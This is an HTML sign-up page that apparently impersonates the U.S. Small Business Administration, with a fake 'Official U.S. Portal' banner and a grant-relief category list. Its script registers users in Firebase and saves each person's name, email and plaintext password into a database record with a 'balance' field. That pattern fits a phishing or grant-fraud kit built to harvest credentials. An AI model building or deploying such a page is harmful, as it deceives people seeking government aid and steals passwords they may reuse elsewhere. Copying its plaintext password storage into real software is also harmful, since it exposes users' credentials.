<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Case Enrollment</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
        .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }
        .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; }
        input, select { font-size: 16px !important; height: 50px; }
        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; }
        .btn-sba:disabled { opacity: 0.7; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="bg-[#efefef] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm">
        <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official U.S. Portal • Secure Enrollment</span>
    </div>

    <main class="flex-grow flex items-center justify-center p-5">
        <div class="w-full max-w-[420px]">
            <div class="auth-card p-6 md:p-10">
                <div class="text-center mb-8">
                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Initialize Case</h2>
                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-2">Federal Enrollment Node V15</p>
                </div>

                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic"></div>

                <form id="registerForm" class="space-y-4">
                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Legal Full Name</label>
                        <input type="text" id="userName" required class="w-full px-4 bg-slate-50 border border-slate-200" placeholder="Enter full name">
                    </div>
                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Government Email</label>
                        <input type="email" id="userEmail" required class="w-full px-4 bg-slate-50 border border-slate-200" placeholder="example@mail.com">
                    </div>
                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Relief Category</label>
                        <select id="reliefType" required class="w-full px-4 bg-slate-50 border border-slate-200">
                            <option value="">Select Grant Type</option>
                            <option value="Small Business Stimulus">Small Business Stimulus</option>
                            <option value="Disaster Relief Grant">Disaster Relief Grant</option>
                            <option value="Entrepreneur Expansion">Entrepreneur Expansion</option>
                        </select>
                    </div>
                    <div class="grid grid-cols-2 gap-3">
                        <div>
                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Passkey</label>
                            <input type="password" id="userPass" required class="w-full px-4 bg-slate-50 border border-slate-200" placeholder="••••••">
                        </div>
                        <div>
                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Confirm</label>
                            <input type="password" id="confirmPass" required class="w-full px-4 bg-slate-50 border border-slate-200" placeholder="••••••">
                        </div>
                    </div>
                    <button type="submit" id="submitBtn" class="btn-sba w-full shadow-lg mt-4">Initialize Secure Case</button>
                </form>
            </div>
        </div>
    </main>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const regForm = document.getElementById('registerForm');
        const alertBox = document.getElementById('alertBox');
        const btn = document.getElementById('submitBtn');

        regForm.onsubmit = async (e) => {
            e.preventDefault();
            const name = document.getElementById('userName').value.trim();
            const email = document.getElementById('userEmail').value.toLowerCase().trim();
            const relief = document.getElementById('reliefType').value;
            const pass = document.getElementById('userPass').value;
            const confirm = document.getElementById('confirmPass').value;

            if (pass !== confirm) { alertBox.innerText = "PASSKEYS DO NOT MATCH"; alertBox.classList.remove('hidden'); return; }
            
            btn.disabled = true;
            btn.innerText = 'CONNECTING TO NODE...';

            try {
                const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
                const user = userCredential.user;

                // Send email first
                await sendEmailVerification(user);

                // Create Database File
                await setDoc(doc(db, "users", user.uid), {
                    uid: user.uid,
                    fullName: name,
                    email: email,
                    password: pass,
                    reliefType: relief,
                    balance: 0,
                    isVerified: false,
                    registeredAt: new Date().toISOString()
                });

                // NO SIGNOUT HERE. Stay logged in to pass to verify.html
                window.location.href = "verify.html";

            } catch (error) {
                btn.disabled = false;
                btn.innerText = "Initialize Secure Case";
                alertBox.innerText = error.message;
                alertBox.classList.remove('hidden');
            }
        };
    </script>
</body>
</html>
